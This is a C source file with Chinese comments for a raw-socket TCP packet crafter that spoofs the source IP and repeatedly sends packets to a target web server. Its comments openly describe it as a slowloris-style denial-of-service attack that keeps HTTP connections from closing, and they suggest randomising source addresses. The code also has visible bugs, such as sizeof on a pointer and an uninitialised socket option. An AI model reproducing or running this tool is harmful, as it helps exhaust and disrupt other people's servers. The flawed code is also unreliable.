#include	"tcp.h"

//int main(int argc, char **argv)

int creator_tcp(void)
{
	int sockfd, len_payload, len_total;
	struct sockaddr_in *src_addr, *dst_addr;

	char *buf, *payload;
	struct ip *header_ip;
	struct tcphdr *header_tcp;

	buf = malloc(200);
	payload = malloc(50);
	src_addr = malloc(sizeof(struct sockaddr_in));
	dst_addr = malloc(sizeof(struct sockaddr_in));

	header_ip = (struct ip *)buf;
	header_tcp = (struct tcphdr *)(buf + sizeof(struct ip));
	payload = buf + sizeof(struct ip) + sizeof(struct tcphdr);

	memset(buf, '\0', sizeof(buf));

	memset(src_addr, '\0', sizeof(struct sockaddr_in));
	memset(dst_addr, '\0', sizeof(struct sockaddr_in));

	len_payload = payload_tcp(payload);

	len_total = sizeof(struct ip) + sizeof(struct tcphdr) + len_payload;

	//构建原始套接字
	sockfd = sock_init_tcp(src_addr, dst_addr);

	//初始化ip报头
	creator_tcphdr_ip(header_ip, src_addr, dst_addr, len_total);

	//初始化tcp报头，并填充数据
	creator_header_tcp(header_tcp);

	//ip校验和是否填充无所谓，网卡会自动计算出来
	header_ip->ip_sum = creator_check_sum(buf, IPPROTO_IP);

	//tcp校验和
	header_tcp->check = creator_check_sum(buf, IPPROTO_TCP);

	//发送tcp数据包
	send_tcp(sockfd, dst_addr, buf, len_payload);

	return 0;
}

int sock_init_tcp(struct sockaddr_in *src_addr, struct sockaddr_in *dst_addr)
{
	int sockfd, on;
	dst_addr->sin_family = AF_INET;
	dst_addr->sin_port = htons(DST_PORT);
	inet_aton(DST_IP, &(dst_addr->sin_addr));

	src_addr->sin_family = AF_INET;
	src_addr->sin_port = htons(SRC_PORT);
	inet_aton(SRC_IP, &(src_addr->sin_addr));

	/*创建一个TCP的原始套接字 */
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

	/*设置套接字选项IP_HDRINCL,由用户程序填写IP头部 */
	setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));

	//setuid(getuid());     //root启动时不需要用setuid获取root权限

	return sockfd;
}

int
creator_tcphdr_ip(struct ip *header_ip, struct sockaddr_in *src_addr,
		  struct sockaddr_in *dst_addr, int len_total)
{
	/*开始填充IP数据报的头部 */
	header_ip->ip_v = IPVERSION;	//IPV4
	header_ip->ip_hl = sizeof(struct ip) >> 2;	//IP数据报的头部长度
	header_ip->ip_tos = 0;	//服务类型
	header_ip->ip_len = htons(len_total);	//IP数据报及其载荷长度，整形且不要转字节序
	header_ip->ip_id = 0;	//IP id 由内核填写
	header_ip->ip_off = 0;	//有内核填写
	header_ip->ip_ttl = 30;	//MAXTTL;
	header_ip->ip_p = IPPROTO_TCP;	//传输层协议为TCP
	header_ip->ip_sum = 0;	//0表示禁用校验和，由网卡来校验
	header_ip->ip_src = src_addr->sin_addr;	//源地址，即攻击来源
	header_ip->ip_dst = dst_addr->sin_addr;	//目的地址，即攻击目标

	printf("dst address is %s\n", inet_ntoa(dst_addr->sin_addr));
	printf("src address is %s\n", inet_ntoa(src_addr->sin_addr));

	return 0;
}

int creator_header_tcp(struct tcphdr *header_tcp)
{
	/*开始填写TCP数据报 */
	header_tcp->source = htons(SRC_PORT);	//源端口
	header_tcp->dest = htons(DST_PORT);	//目的端口
	header_tcp->seq = htons(100);	//发送序列号
	header_tcp->ack_seq = htons(200);	//确认序号  
	header_tcp->doff = 5;	//数据偏离位置即data off,其实就是header_tcp报头长度，
	//5表示5个双字，即5X4=20字节，通常是5
	//如果要使报文带有选项，可以设置为6或7或8
	//分别带有1个，2个，3个TCP选项

	//这里如果胡乱天，会导致构造的数据包无法被wireshark解析，
	//并提示[Malformed Packet: GSM over IP]
	header_tcp->res1 = 0;
	header_tcp->res2 = 0;
	header_tcp->urg = 0;
	header_tcp->ack = 1;
	header_tcp->psh = 1;
	header_tcp->rst = 0;	//这里不启用rst字段，这样http请求就会更逼真
	header_tcp->syn = 0;
	header_tcp->fin = 0;

	header_tcp->window = htons(100);
	header_tcp->check = 0;
	header_tcp->urg_ptr = 0;

	return 0;
}

int
send_tcp(int sockfd, struct sockaddr_in *dst_addr, char *buf, int len_payload)
{
	int ret;
	while (1) {
		/*循环发送攻击包 */
		/*随机产生源地址，使服务器收不到最后一个ACK应答 */
		//      header_ip->ip_src.s_addr=random();

		//开始发送攻击数据报, 这里buf是个复杂的数据，经过两次强制指针转换，这是个技巧。
		//另外还在结尾又追加了一段数据，这个指针是个很特殊的指针.
		//不能当成字符串看待,不能用strlen(buf)获取长度。这部能用strlen(data)。
		//sendto第三个参数如果用sizeof(buf)即100，并且payload结尾只有1个\r\n，会是什么效果呢？
		//buf实际长度是sizeof(struct ip)+sizeof(struct tcphdr)+strlen(payload),这个长度不会超过100bytes。
		//效果是tcp会认为数据没有发完,wireshark提示[Bytes in flight: 60]，
		//这时虽然strlen(payload)只有十几个字节，但是剩下的部分会用0填充，总共还是60字节，整个数据包长度共114字节
		//114 = 60字节数据 + IP报头(20bytes) + TCP报头(20bytes) + 以太网帧长度(14bytes) 
		//100 = 60字节数据 + IP报头(20bytes) + TCP报头(20bytes)
		//还有另外一种情况，如果payload有两个回车换号\r\n\r\n那么tcp认为已经发送完成，这就是一个完整的数据包。
		//这就是说如果只有一个回车换行\r\n，tcp认为没有发送完成，还会有数据要发送，web服务端的底层http协议也认为没有完成
		//这时web服务器就会一直等待，并且不会关闭这个http连接，直到超时，才会回收资源。这时如果客户端设置了keepalived，
		//那么服务端永远不会超时，永远不会回收资源，这就是slowloris的攻击原理，只不过我这个是C语言版，
		//刚看了slowloris的源码，并没有用到keepalived，就是简单的多线程发送数据包
		ret = sendto(sockfd, buf, 40 + len_payload, 0,
			     (struct sockaddr *)dst_addr,
			     sizeof(struct sockaddr));
		printf("the ret is %d===\n", ret);

		sleep(1);
	}

	return 0;
}
